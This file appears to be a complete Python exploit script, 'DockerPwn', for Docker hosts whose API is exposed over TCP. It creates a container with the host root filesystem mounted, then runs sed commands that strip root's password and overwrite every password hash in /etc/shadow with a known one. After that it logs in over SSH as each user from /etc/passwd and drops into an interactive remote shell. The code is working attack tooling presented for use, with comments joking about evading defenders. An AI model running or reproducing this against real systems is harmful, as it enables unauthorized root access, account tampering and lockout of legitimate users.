#/usr/bin/python3

'''
Exploit for exposed Docker TCP Socket.

This will automatically create a container on the Docker host with the root filesystem mounted,
allowing arbitrary read and write of the root filesystem (which is bad).

Once created, the script will empty the password requirement for 'root', and will alter any user
with a valid Unix password to have a password of 'DockerPwn'

Once this is done, the script will attempt to use Paramiko to login to all users enumerated from 
/etc/passwd using the password 'DockerPwn', and a shell will be spawned. 

Roadmap:

Utilize the limited command execution via Paramiko to get a better shell, and automatically escalate to root.


Usage:

DockerPwn.py [-h] [--target TARGET] [--port PORT]

optional arguments:
  -h, --help       show this help message and exit
  --target TARGET  IP of Docker Host
  --port PORT      Docker API TCP Port

'''
import sys
import time
import paramiko
import argparse
import socket
import json
import http.client
import re

def main():

    parser = argparse.ArgumentParser()
    parser.add_argument("--target", help="IP of Docker Host", type=str)
    parser.add_argument("--port", help="Docker API TCP Port", type=int)
    args = parser.parse_args()
    target = args.target
    port = args.port

    if target is not None and port is not None:
        makeRequest(target, port)
    else:
        print("[!] You must specify a target and port. Exiting.")
        sys.exit(0)


def makeRequest(target, port):
    
    dockerConnection = http.client.HTTPConnection(target, port)

    headers = {
        'X-Requested-With': 'DockerPwn.py',
        'Content-Type': 'application/json',
    }
    
    dockerConnection.request('GET', '/containers/json')
    
    apiProbeResponse = dockerConnection.getresponse()


    if apiProbeResponse.status == 200:
        print('\n\n[+] Successfully probed the API. Writing out list of containers just in case there\'s something cool.\n')
        f = open("ContainerList.txt", "w+")
        f.write(str(apiProbeResponse.read()))
        f.close()
        dockerConnection.close()
    else:
        print('[-] API responded in unexpected way. Got ' + apiProbeResponse.status + ' ' + apiProbeResponse.reason)
        dockerConnection.close()
        sys.exit(0)

    try:

        print("[+] Downloading latest Alpine Image for a lightweight pwning experience.\n")

        dockerConnection.request('POST', '/images/create?fromImage=alpine&tag=latest')
        imageStatus = dockerConnection.getresponse()

        if imageStatus.status == 200:
            print("[+] Alpine image is downloading to the host. Hope we aren't setting off any alarms. Sleeping for a bit.\n")
            dockerConnection.close()
            timeout = time.time() + 1
            while time.time() < timeout:
	            cursorWait="\|/-\|/-"
	            for l in cursorWait:
		            sys.stdout.write(l)
		            sys.stdout.flush()
		            sys.stdout.write('\b')
		            time.sleep(0.2)
        else:
            print('[-] API refused to download Alpine Linux. Exiting.')
            dockerConnection.close()
            sys.exit(0)

        print("[+] Alright, creating Alpine Linux Container now...\n")

        containerJSON = json.dumps({
            "Hostname": "",
            "Domainname": "",
            "User": "",
            "AttachStdin": True,
            "AttachStdout": True,
            "AttachStderr": True,
            "Tty": True,
            "OpenStdin": True,
            "StdinOnce": True,
            "Entrypoint": "/bin/sh",
            "Image": "alpine",
            "Volumes": {"/host/": {}},
            "HostConfig": {"Binds": ["/:/host"]},
        })

        dockerConnection.request('POST', '/containers/create', containerJSON, headers)
        creationResponse = dockerConnection.getresponse()

        if creationResponse.status == 201:
    
            creationResponse = str(creationResponse.read())
            containerID = re.findall(r'[A-Fa-f0-9]{64}', creationResponse)
            print('[+] Success! Created container with root volume mounted. Got ID ' + containerID[0] + '!\n')
            dockerConnection.close()
        else:
            print('[-] API did not return a valid container ID, no container created.')
            dockerConnection.close()
            sys.exit(0)

        print('[+] Starting container ' + containerID[0] + '\n')
        dockerConnection.request('POST', '/containers/' + containerID[0] + '/start')
        startResponse = dockerConnection.getresponse()

        if startResponse.status == 204:
            print('[+] Container successfully started. Blue team will be with you shortly.\n')
            dockerConnection.close()
        else:
            print('[-] Container refused to start. Maybe try again. Insert shrug emoji here.\n')
            dockerConnection.close()
            sys.exit(0)


        print('[+] Phew, alright. Creating the EXEC to change passwords.\n')


        execJSON = json.dumps({
            "AttachStdin": True,
            "AttachStdout": True,
            "AttachStderr": True,
            "Cmd": ["/bin/sh", "-c", "cat /host/etc/passwd | grep -oE '^[^:]+' | tr '\\n' ' ' && sed -i 's/root:x:/root::/g' /host/etc/passwd && sed -i -e 's/:$6[^:]\+:/:$6$ilDk.19ZUBhQbxkA$6rv9s1sJcecVNwwW2V9uEl4QlJ\/V0d5JK\/lXAAdSUF7W3b2oGmp37I2qm.2iNGt.JXqKdoW4oGHaUSgABP5vA.:/' /host/etc/shadow"],
            "DetachKeys": "ctrl-p,ctrl-q",
            "Privileged": True,
            "Tty": True,
        })
        
        dockerConnection.request('POST', '/containers/' + containerID[0] + '/exec', execJSON, headers)
        execResponse = dockerConnection.getresponse()
        
        if execResponse.status == 201:
            execResponse = str(execResponse.read())
            execID = re.findall(r'[A-Fa-f0-9]{64}', execResponse)
            print('[+] EXEC successfully created on container! Got ID ' + execID[0] + '!\n')
            dockerConnection.close()
        else:
            print('[-] EXEC creation failed. Maybe try again?\n')
            dockerConnection.close()
            sys.exit(0)

        print('[+] Now triggering the EXEC to change passwords. Hope SSH is open...\n')

        triggerJSON = json.dumps({
            "Detach": False,
            "Tty": False
        })

        dockerConnection.request('POST', '/exec/' + execID[0] + '/start', triggerJSON, headers)
        triggerResponse = dockerConnection.getresponse()

        if triggerResponse.status == 200:
            print('[+] EXEC successfully triggered. Printing users found in /etc/passwd.\n')
            try:
                triggerResponse = str(triggerResponse.read())
                triggerResponse = triggerResponse.split('root')[-1]
                userList = triggerResponse.split(' ')
                userList.insert(0, 'root')
                userList.remove('')
                userList.remove('\'')
                print('[!] User List: ' + ' '.join(userList) + '\n')
            except:
                pass
            dockerConnection.close()
        else:
            print('[-] EXEC job did not trigger. Maybe our ID was wrong?')
            sys.exit(0)

    except Exception as e:
        print(e)

    shellHandler(target, userList)

def shellHandler(target, userList):

    print('[+] OK, looking good. Attempting to open shell as root. This may take a minute or two.\n')

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
    for user in userList:
        conn = 'null'
        try:
            conn = ssh.connect(target, 22, user, "DockerPwn")
        except paramiko.AuthenticationException:
            print('[-] Login failed for ' + user)
            ssh.close()
        if conn is None:
            print('[+] Login succeeded for ' + user + '!\n')
            while True:
                prompt_response = input("DockerPwn@" + target + "> ")
                stdin, stdout, stderr = ssh.exec_command(prompt_response, get_pty=True)
                if stdout is not None:
                    formattedOut = str(stdout.readlines())
                    formattedOut = formattedOut.replace("[", "")
                    formattedOut = formattedOut.replace("]", "")
                    formattedOut = formattedOut.replace("'", "")
                    formattedOut = formattedOut.replace("\\r\\n", "")
                    formattedOut = formattedOut.replace(" , ", " ")
                    print(formattedOut)
                if stderr is not None:
                    formattedErr = str(stdout.readlines())
                    formattedErr = formattedErr.replace("[", "")
                    formattedErr = formattedErr.replace("]", "")
                    formattedErr = formattedErr.replace("'", "")
                    formattedErr = formattedErr.replace("\\r\\n", "")
                    formattedErr = formattedErr.replace(" , ", " ")
                    print(formattedErr)
            

    

if __name__ == '__main__':
    main()
